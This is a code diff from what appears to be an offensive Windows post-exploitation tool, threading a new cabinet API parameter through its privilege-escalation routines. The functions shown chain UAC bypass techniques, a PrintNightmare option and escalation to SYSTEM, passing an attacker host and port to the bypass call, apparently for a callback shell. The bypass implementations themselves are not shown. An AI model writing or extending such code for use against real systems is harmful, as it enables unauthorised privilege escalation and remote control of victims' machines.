@@ -12,11 +12,11 @@
 
 #include "LoadAPI.h"
 
-BOOL PrivEscExploit(Kernel32_API kernel32, Advapi32_API advapi32, Shell32_API shell32, Arguments listAgrument, char* portStr){
+BOOL PrivEscExploit(Kernel32_API kernel32, Advapi32_API advapi32, Shell32_API shell32, Cabinet_API cabinetAPI, Arguments listAgrument, char* portStr){
     char* CurrentProcessPath = (char*)calloc(MAX_PATH, 1);
     if (CurrentProcessPath != NULL){
         if (kernel32.GetModuleFileNameAF(0, CurrentProcessPath, MAX_PATH) != 0){
-            if (RunUacBypass(kernel32, advapi32, shell32,CurrentProcessPath, listAgrument.host, portStr, listAgrument.UacBypassTec, listAgrument.wincatDefaultDir)){
+            if (RunUacBypass(kernel32, advapi32, shell32, cabinetAPI, CurrentProcessPath, listAgrument.host, portStr, listAgrument.UacBypassTec, listAgrument.wincatDefaultDir)){
                 printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC Bypass worked !\n");
                 free(CurrentProcessPath);
                 return TRUE;
@@ -30,12 +30,12 @@ BOOL PrivEscExploit(Kernel32_API kernel32, Advapi32_API advapi32, Shell32_API sh
 
 
 
-BOOL PrivEsc(Kernel32_API kernel32, Advapi32_API advapi32, Shell32_API shell32, Arguments listAgrument){
+BOOL PrivEsc(Kernel32_API kernel32, Advapi32_API advapi32, Shell32_API shell32, Cabinet_API cabinetAPI, Arguments listAgrument){
     char portStr[12];
     _itoa_s(listAgrument.port, portStr, sizeof(portStr), 10);
 
     if (listAgrument.UacBypassTec == UAC_BYPASS_PRINT_NIGHTMARE){
-        return PrivEscExploit(kernel32, advapi32, shell32,listAgrument, portStr);
+        return PrivEscExploit(kernel32, advapi32, shell32, cabinetAPI, listAgrument, portStr);
     } else{
         if (IsRunAsAdmin(advapi32)){
             printMsg(STATUS_INFO, LEVEL_DEFAULT, "Process running with admin priv !\n");
@@ -46,9 +46,9 @@ BOOL PrivEsc(Kernel32_API kernel32, Advapi32_API advapi32, Shell32_API shell32, 
                 GetSystem(kernel32, advapi32);
         } else{
             printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Process not running with admin priv\n");
-            if (IsUserInAdminGroup()){
+            if (IsUserInAdminGroup(kernel32, advapi32)){
                 printMsg(STATUS_INFO, LEVEL_DEFAULT, "User is in the admin group\n");
-                PrivEscExploit(kernel32, advapi32, shell32, listAgrument, portStr);
+                PrivEscExploit(kernel32, advapi32, shell32,cabinetAPI, listAgrument,  portStr);
             } else
                 printMsg(STATUS_ERROR, LEVEL_DEFAULT, "User is no in the admin group");
         }
